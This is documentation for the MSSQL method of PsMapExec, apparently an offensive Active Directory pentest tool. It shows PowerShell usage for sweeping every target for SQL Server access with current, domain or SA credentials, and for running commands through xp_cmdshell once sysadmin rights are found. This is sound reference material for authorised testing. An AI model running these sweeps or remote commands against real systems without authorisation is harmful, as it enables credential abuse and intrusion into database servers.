# MSSQL

### **Description**

PsMapExec has incorporated support for the MSSQL method, representing a recent addition to its feature set. It is important to acknowledge that this functionality is still in its early stages and may exhibit occasional bugs and inaccuracies. Upcoming revisions are aimed at refining the MSSQL method, with a focus on introducing modules for tasks such as credential retrieval from databases, privilege escalation, and various other attack vectors.

### Authentication Types

The MSSQL module supports the following authentication types

```powershell
# Current user
PsMapExec -Targets All -Method MSSQL

# With Username and Password (Domain authentication)
PsMapExec -Targets All -Method MSSQL -Username [Username] -Password [Password]

# Local Authentication (Authenticates through SQL Server login)
PsMapExec -Targets All -Method MSSQL -Username SA -Password Password123 -LocalAuth
```

### &#x20;**Status messages**

Status messages are returned to the console to indicate what level of access we may have to a specified instance.

```powershell
[+] ACCESSIBLE INSTANCE # The instance is accessible, without sysadmin rights
[-] ACCESS DENIED       # Access is denied to the instance
[+] SYSADMIN            # You are a sysadmin on the instance, try executing commands
```

<figure><img src="../../.gitbook/assets/image (2107).png" alt=""><figcaption></figcaption></figure>

### Command Execution

If you have sysadmin rights you can supply the `-Command` parameter to PsMapExec. xp\_cmdshell needs to be enabled to perform command execution, if it is not PsMapExec will attempt to enable it and, after doing so will revert xp\_cmdshell to its original state if it has been altered.

```powershell
PsMapExec -Targets All -Method MSSQL -Command "whoami"
```

<figure><img src="../../.gitbook/assets/image (2109).png" alt=""><figcaption></figcaption></figure>
